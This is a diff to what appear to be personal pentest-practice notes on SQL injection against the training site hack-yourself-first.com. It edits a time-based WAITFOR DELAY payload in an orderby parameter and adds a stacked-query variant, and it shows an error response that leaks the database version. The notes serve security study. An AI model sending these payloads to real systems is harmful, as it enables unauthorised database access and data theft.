@@ -4,7 +4,7 @@
 ### Time Based
 Req
 ```http
-GET /Make/2?orderby=supercarid;WAITFOR+DELAY+'00:00:04'-- HTTP/2
+GET /Make/2?orderby=supercarid+WAITFOR+DELAY+'00:00:04'-- HTTP/2
 Host: hack-yourself-first.com
 ```
 
@@ -29,6 +29,13 @@ Host: hack-yourself-first.com
 Response
 ```
 Conversion failed when converting the nvarchar value 'Microsoft SQL Azure (RTM) - 12.0.2000.8 <br>	Nov &nbsp;2 2023 01:40:17 <br>	Copyright (C) 2022 Microsoft Corporation<br>' to data type int.</title>
+```
+
+### Stacked queried
+Req
+```
+GET /Make/2?orderby=supercarid;WAITFOR+DELAY+'00:00:04'-- HTTP/2
+Host: hack-yourself-first.com
 ```
 
 
